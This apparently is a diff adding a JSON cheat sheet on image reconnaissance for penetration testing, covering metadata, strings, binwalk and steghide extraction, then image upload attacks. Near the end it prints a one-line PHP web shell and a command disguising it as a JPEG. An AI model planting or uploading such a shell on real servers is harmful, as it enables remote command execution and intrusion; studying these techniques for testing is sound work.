@@ -1,0 +1,270 @@
+[
+  {
+    "type": "section_heading",
+    "id": "image-intro",
+    "text": "Image Recon and Exploitation Cheat Sheet"
+  },
+  {
+    "type": "order_block",
+    "id": "image-definition",
+    "text": "Images on websites can contain sensitive information such as metadata, hidden data, exposed paths, or even embedded credentials. Attackers often analyze images to gather intelligence or discover vulnerabilities."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "image-download",
+    "text": "Download Image From Target"
+  },
+  {
+    "type": "code_block",
+    "id": "image-download-code",
+    "language": "bash",
+    "code": "wget https://target.com/images/logo.png\ncurl -O https://target.com/uploads/image.jpg"
+  },
+  {
+    "type": "output_block",
+    "id": "image-download-output",
+    "language": "text",
+    "code": "logo.png saved\nimage.jpg saved"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "image-metadata",
+    "text": "Extract Image Metadata"
+  },
+  {
+    "type": "code_block",
+    "id": "image-metadata-code",
+    "language": "bash",
+    "code": "exiftool image.jpg"
+  },
+  {
+    "type": "output_block",
+    "id": "image-metadata-output",
+    "language": "text",
+    "code": "File Name: image.jpg\nCamera Model: Canon EOS\nAuthor: admin\nSoftware: Adobe Photoshop\nCreation Date: 2024:01:12"
+  },
+  {
+    "type": "order_block",
+    "id": "image-metadata-analysis",
+    "text": "Metadata may reveal usernames, GPS coordinates, software versions, or internal file paths."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "image-hidden-strings",
+    "text": "Extract Hidden Strings"
+  },
+  {
+    "type": "code_block",
+    "id": "image-strings-code",
+    "language": "bash",
+    "code": "strings image.jpg"
+  },
+  {
+    "type": "output_block",
+    "id": "image-strings-output",
+    "language": "text",
+    "code": "admin\npassword123\n/uploads/private/\ninternal-server"
+  },
+  {
+    "type": "order_block",
+    "id": "image-strings-analysis",
+    "text": "The strings command reveals readable text embedded inside the image binary."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "image-binwalk",
+    "text": "Detect Embedded Files"
+  },
+  {
+    "type": "code_block",
+    "id": "image-binwalk-code",
+    "language": "bash",
+    "code": "binwalk image.jpg"
+  },
+  {
+    "type": "output_block",
+    "id": "image-binwalk-output",
+    "language": "text",
+    "code": "DECIMAL       HEXADECIMAL     DESCRIPTION\n-------------------------------------------------\n0             0x0              JPEG image data\n10567         0x2947           ZIP archive data"
+  },
+  {
+    "type": "order_block",
+    "id": "image-binwalk-analysis",
+    "text": "Sometimes files like ZIP archives are hidden inside images."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "image-extract-binwalk",
+    "text": "Extract Hidden Files"
+  },
+  {
+    "type": "code_block",
+    "id": "image-binwalk-extract",
+    "language": "bash",
+    "code": "binwalk -e image.jpg"
+  },
+  {
+    "type": "output_block",
+    "id": "image-binwalk-extract-output",
+    "language": "text",
+    "code": "_image.jpg.extracted/\nsecret.zip"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "image-steganography",
+    "text": "Steganography Detection"
+  },
+  {
+    "type": "code_block",
+    "id": "image-steg-code",
+    "language": "bash",
+    "code": "steghide info image.jpg"
+  },
+  {
+    "type": "output_block",
+    "id": "image-steg-output",
+    "language": "text",
+    "code": "embedded file: secret.txt\nsize: 2 KB"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "image-steg-extract",
+    "text": "Extract Hidden Steganography Data"
+  },
+  {
+    "type": "code_block",
+    "id": "image-steg-extract-code",
+    "language": "bash",
+    "code": "steghide extract -sf image.jpg"
+  },
+  {
+    "type": "output_block",
+    "id": "image-steg-extract-output",
+    "language": "text",
+    "code": "wrote extracted data to secret.txt"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "image-file-type",
+    "text": "Check File Type"
+  },
+  {
+    "type": "code_block",
+    "id": "image-file-type-code",
+    "language": "bash",
+    "code": "file image.jpg"
+  },
+  {
+    "type": "output_block",
+    "id": "image-file-type-output",
+    "language": "text",
+    "code": "image.jpg: JPEG image data"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "image-hash",
+    "text": "Generate Image Hash"
+  },
+  {
+    "type": "code_block",
+    "id": "image-hash-code",
+    "language": "bash",
+    "code": "md5sum image.jpg\nsha256sum image.jpg"
+  },
+  {
+    "type": "output_block",
+    "id": "image-hash-output",
+    "language": "text",
+    "code": "c0ffeec0ffeec0ffee image.jpg"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "image-reverse-search",
+    "text": "Reverse Image Search"
+  },
+  {
+    "type": "order_block",
+    "id": "image-reverse-search-text",
+    "text": "Reverse image search can reveal where the image appears on the internet and may expose staging servers or development environments."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "image-source-code",
+    "text": "Find Image Paths in Source Code"
+  },
+  {
+    "type": "code_block",
+    "id": "image-source-code-block",
+    "language": "html",
+    "code": "<img src=\"/uploads/private/admin.png\">"
+  },
+  {
+    "type": "output_block",
+    "id": "image-source-output",
+    "language": "text",
+    "code": "Possible hidden directory: /uploads/private/"
+  },
+
+  {
+    "type": "section_heading",
+    "id": "image-upload-testing",
+    "text": "Testing Image Upload Vulnerabilities"
+  },
+  {
+    "type": "code_block",
+    "id": "image-upload-code",
+    "language": "php",
+    "code": "<?php system($_GET['cmd']); ?>"
+  },
+  {
+    "type": "order_block",
+    "id": "image-upload-analysis",
+    "text": "Sometimes attackers upload images containing embedded web shells if the server does not properly validate file types."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "image-polyglot",
+    "text": "Image Polyglot Technique"
+  },
+  {
+    "type": "code_block",
+    "id": "image-polyglot-code",
+    "language": "bash",
+    "code": "cat shell.php > shell.jpg"
+  },
+  {
+    "type": "output_block",
+    "id": "image-polyglot-output",
+    "language": "text",
+    "code": "Creates a file that appears as an image but contains executable code."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "image-summary",
+    "text": "Important Image Recon Commands"
+  },
+  {
+    "type": "code_block",
+    "id": "image-summary-code",
+    "language": "bash",
+    "code": "exiftool image.jpg\nstrings image.jpg\nbinwalk image.jpg\nsteghide info image.jpg"
+  },
+  {
+    "type": "order_block",
+    "id": "image-summary-text",
+    "text": "These commands quickly identify metadata, hidden text, embedded files, and steganography inside images."
+  }
+]
